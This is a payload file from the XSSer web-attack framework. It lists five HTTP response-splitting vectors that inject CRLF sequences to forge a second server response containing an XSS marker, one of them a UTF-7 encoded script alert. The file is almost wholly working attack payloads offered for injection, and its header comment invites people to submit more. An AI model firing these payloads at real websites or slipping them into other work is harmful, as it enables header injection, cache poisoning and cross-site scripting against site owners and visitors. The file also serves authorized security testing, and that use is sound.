"""
$Id$

This file is part of the xsser project, http://xsser.sourceforge.net.

Copyright (c) 2011/2012 psy <root@lordepsylon.net> - <epsylon@riseup.net>

xsser is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 3 of the License.

xsser is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with xsser; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

## XXSer.py @@ HTTP Splitting Response vectors @@ psy
#
## This file contains different XSS vectors to inject and try to create a HTTP "split" output response.
## If you have some new vectors, please email me to [root@lordepsylon.net - epsylon@riseup.net] and will be added to XSSer framework.
## Thats all.
###
## Happy Cross Hacking! ;)

HTTPrs_vectors = [
		{ 'payload' : """%0d%0AContent-Length:%200%0d%0A%0d%0AHTTP/1.1%20200%20OK%0d%0AContent-Length:%2016%0d%0A%0d%0A&lt;html&gt;XSS&lt;/html&gt;
			""",
                  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified: Wed, 13 Jan 2006 12:44:23 GMT%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1""",
		  'browser' : """[Induced Injection]"""},
				
		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aCache-Control: no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1
			""",
                  'browser' : """[Induced Injection]"""},

		{ 'payload' : """%0d%0aContent-Type: text/html%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aPragma:no-cache%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>XSS</html>%20HTTP/1.1
			""",
		  'browser' : """[Induced Injection]""" },

		{ 'payload' : """%0d%0AContent-Type: text/html;charset=UTF-7%0A%0A%2BADw-script%2BAD4-alert('%58%53%53');%2BADw-/script%2BAD4-
			""",
                  'browser' : """[Induced Injection]""" }

		]


